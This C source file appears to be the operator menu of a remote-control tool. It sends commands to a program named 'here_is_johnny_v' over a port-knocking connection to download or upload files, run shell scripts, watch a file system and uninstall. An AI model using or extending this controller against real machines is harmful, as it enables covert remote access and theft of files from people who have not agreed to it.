#include <stdio.h>
#include <string.h>
#include "../../../include/app/menu/command_menu_processor.h"
#include "../../../include/app/commands/port_knocking.h"
#include "../../../include/lib/utils/file_util.h"
#include "../../../include/app/connection/connection.h"

// ANSI color codes for console output
#define ANSI_COLOR_YELLOW "\x1b[33m"
#define ANSI_COLOR_RESET "\x1b[0m"

// Constants
#define DOWNLOAD_FILE_COMMAND "download"
#define WATCH_FS_COMMAND "watch-fs"
#define UNINSTALL_COMMAND "uninstall"
#define DISCONNECT_COMMAND "disconnect"


// Static function definitions

void display_command_menu() {
    printf("\n\n==============================\n");
    printf(ANSI_COLOR_YELLOW "     Command Menu\n" ANSI_COLOR_RESET);
    printf("==============================\n");
    printf("1. Help\n");
    printf("2. Download File\n");
    printf("3. Upload File\n");
    printf("4. Send Shell Script\n");
    printf("5. Watch File System\n");
    printf("6. Uninstall\n");
    printf("0. Exit\n");
    printf("==============================\n");
}

void handle_display_help() {
    printf("\n\n==============================================================================================================\n");
    printf("                                                    Help\n");
    printf("==============================================================================================================\n");
    printf("\nThis menu allows you to send commands to the 'here_is_johnny_v' program.\n");
    printf("Choose an option from the menu to send a command.\n");
    printf("This program should not be used for malicious purposes.\n");
    printf("\n==============================================================================================================\n");
}

void handle_download_file() {

    // Prompt for file location
    printf(ANSI_COLOR_YELLOW "\nEnter the file location: " ANSI_COLOR_RESET);
    fflush(stdout);

    // Receive input from user
    char file_path[100];
    fgets(file_path, sizeof(file_path), stdin);
    file_path[strcspn(file_path, "\n")] = 0; // Remove newline character

    // Concatenate the command with the file path
    char command[100];
    snprintf(command, sizeof(command), "%s %s", DOWNLOAD_FILE_COMMAND, file_path);

    // Send the command
    send_command(command);
}

void handle_upload_file() {

    // Prompt for file location
    printf(ANSI_COLOR_YELLOW "\nEnter the file location: " ANSI_COLOR_RESET);
    fflush(stdout);

    // Receive input from user
    char file_path[100];
    fgets(file_path, sizeof(file_path), stdin);
    file_path[strcspn(file_path, "\n")] = 0; // Remove newline character

    // Read the file content
    char* fileContent = read_file(file_path);
    if (fileContent == NULL) {
        printf("Failed to read file\n");
        return;
    }

    // Send the file content
    send_file(fileContent);
}

void handle_send_shell_script() {

    // Prompt for the shell script
    printf(ANSI_COLOR_YELLOW "\nEnter the shell script: " ANSI_COLOR_RESET);
    fflush(stdout);
    char script[100];
    fgets(script, sizeof(script), stdin);
    script[strcspn(script, "\n")] = 0; // Remove newline character


    send_shell_script(script);
}

void handle_watch_file_system() {

    // Prompt for file location
    printf("\nEnter the file or directory location: ");
    fflush(stdout);

    // Receive input from user
    char file_path[100];
    fgets(file_path, sizeof(file_path), stdin);
    file_path[strcspn(file_path, "\n")] = 0; // Remove newline character

    // Concatenate the command with the file path
    char command[100];
    snprintf(command, sizeof(command), "%s %s", WATCH_FS_COMMAND, file_path);

    // Send the command
    send_command(command);
}

void handle_uninstall() {
    send_command(UNINSTALL_COMMAND);
    unset_network_interface_name();
    unset_destination_mac();
    unset_destination_ip();
}

void handle_disconnect() {
    send_command(DISCONNECT_COMMAND);
    unset_network_interface_name();
    unset_destination_mac();
    unset_destination_ip();
}
